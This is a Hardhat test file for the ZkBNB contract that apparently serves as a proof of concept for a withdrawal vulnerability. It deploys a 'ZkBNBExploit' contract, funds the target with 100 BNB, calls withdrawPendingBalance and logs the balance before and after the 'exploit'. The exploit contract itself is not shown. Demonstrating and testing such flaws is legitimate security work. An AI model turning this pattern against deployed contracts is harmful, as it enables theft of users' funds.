import { ethers } from 'hardhat';
import chai, { expect } from 'chai';
import { smock } from '@defi-wonderland/smock';

import {
  CommitBlockInfo,
  EMPTY_STRING_KECCAK,
  PubDataType,
  PubDataTypeMap,
  StoredBlockInfo,
  encodePackPubData,
  hashStoredBlockInfo,
  padEndBytes121,
} from './util';

chai.use(smock.matchers);

describe('ZkBNB', function () {
  let mockGovernance;
  let mockZkBNBVerifier;
  let mockZNSController;
  let mockPublicResolver;
  let mockERC20;
  let mockERC721;
  let mockNftFactory;
  let zkBNB;
  let zkBNBExploit;
  let additionalZkBNB;
  let owner, addr1, addr2, addr3, addr4;
  const accountNameHash = ethers.utils.keccak256(ethers.utils.toUtf8Bytes('accountNameHash'));

  const genesisStateRoot = ethers.utils.formatBytes32String('genesisStateRoot');
  const commitment = ethers.utils.formatBytes32String('');
  const genesisBlock: StoredBlockInfo = {
    blockSize: 0,
    blockNumber: 0,
    priorityOperations: 0,
    pendingOnchainOperationsHash: EMPTY_STRING_KECCAK,
    timestamp: 0,
    stateRoot: genesisStateRoot,
    commitment,
  };

  // `ZkBNB` needs to link to library `Utils` before deployed
  let utils;
  const newStateRoot = ethers.utils.formatBytes32String('newStateRoot');

  // `beforeEach` will run before each test, re-deploying the contract every
  // time. It receives a callback, which can be async.
  beforeEach(async function () {
    [owner, addr1, addr2, addr3, addr4] = await ethers.getSigners();

    mockGovernance = await smock.fake('Governance');
    mockZkBNBVerifier = await smock.fake('ZkBNBVerifier');
    mockZNSController = await smock.fake('ZNSController');
    mockPublicResolver = await smock.fake('PublicResolver');
    mockERC20 = await smock.fake('ERC20');
    mockERC721 = await smock.fake('ERC721');

    mockNftFactory = await smock.fake('ZkBNBNFTFactory');

    const Utils = await ethers.getContractFactory('Utils');
    utils = await Utils.deploy();
    await utils.deployed();

    const AdditionalZkBNB = await ethers.getContractFactory('AdditionalZkBNB');
    additionalZkBNB = await AdditionalZkBNB.deploy();
    await additionalZkBNB.deployed();

    const ZkBNB = await ethers.getContractFactory('ZkBNBTest', {
      libraries: {
        Utils: utils.address,
      },
    });
    zkBNB = await ZkBNB.deploy();
    await zkBNB.deployed();

    const ZkBNBExploit = await ethers.getContractFactory('ZkBNBExploit');
    zkBNBExploit = await ZkBNBExploit.deploy(zkBNB.address);
    await zkBNBExploit.deployed();

    const initParams = ethers.utils.defaultAbiCoder.encode(
      ['address', 'address', 'address', 'address', 'address', 'bytes32'],
      [
        mockGovernance.address,
        mockZkBNBVerifier.address,
        additionalZkBNB.address,
        mockZNSController.address,
        mockPublicResolver.address,
        genesisStateRoot,
      ],
    );
    await zkBNB.initialize(initParams);

    await zkBNB.setDefaultNFTFactory(mockNftFactory.address);
  });

  describe('commit blocks', function () {
    const nftContentHash = ethers.utils.keccak256(ethers.utils.toUtf8Bytes('nftContentHash'));
    const ASSET_ID = 3;
    const TOKEN_ID = 3;

    it('withdrawPendingBalance BNB test', async () => {
      const ONE_ETHER = ethers.utils.parseEther('1');
      await owner.sendTransaction({
        to: zkBNB.address,
        value: ONE_ETHER.mul(100),
      });
      await zkBNB.mockIncrease1BnbToWithdraw(zkBNBExploit.address);
      const ZERO_ADDR = "0x0000000000000000000000000000000000000000";
      console.log(`getPendingBalance: ${(await zkBNB.getPendingBalance(zkBNBExploit.address, ZERO_ADDR)).div(ONE_ETHER)} BNB`);
      console.log(`zkBnbBalance before exploit: ${(await ethers.provider.getBalance(zkBNB.address)).div(ONE_ETHER)} BNB`);
      await zkBNB.withdrawPendingBalance(
        zkBNBExploit.address,
        ZERO_ADDR,
        ONE_ETHER
      );
      console.log(`zkBnbBalance after exploit: ${(await ethers.provider.getBalance(zkBNB.address)).div(ONE_ETHER)} BNB`);
    });
  });
});
